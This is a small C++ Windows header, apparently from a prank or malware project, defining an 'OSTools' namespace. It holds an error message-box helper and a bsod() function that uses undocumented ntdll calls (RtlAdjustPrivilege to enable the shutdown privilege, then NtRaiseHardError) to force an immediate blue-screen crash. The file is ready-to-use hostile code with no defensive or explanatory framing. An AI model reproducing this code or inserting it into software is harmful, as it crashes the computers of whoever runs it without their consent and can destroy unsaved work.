#pragma once


#include <Windows.h>
#include <string>


typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);


namespace OSTools {
	static void error(const std::wstring& msg) {
		MessageBox(NULL, msg.c_str(), L"C:\\you", MB_ICONERROR | MB_OK);
	}
	static void bsod() {
        BOOLEAN f;
        ULONG u;
        LPVOID s = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
        LPVOID l = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
        pdef_RtlAdjustPrivilege t = (pdef_RtlAdjustPrivilege)s;
        pdef_NtRaiseHardError N = (pdef_NtRaiseHardError)l;
        NTSTATUS NtRet = t(19, TRUE, FALSE, &f);
        N(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &u);
	}
}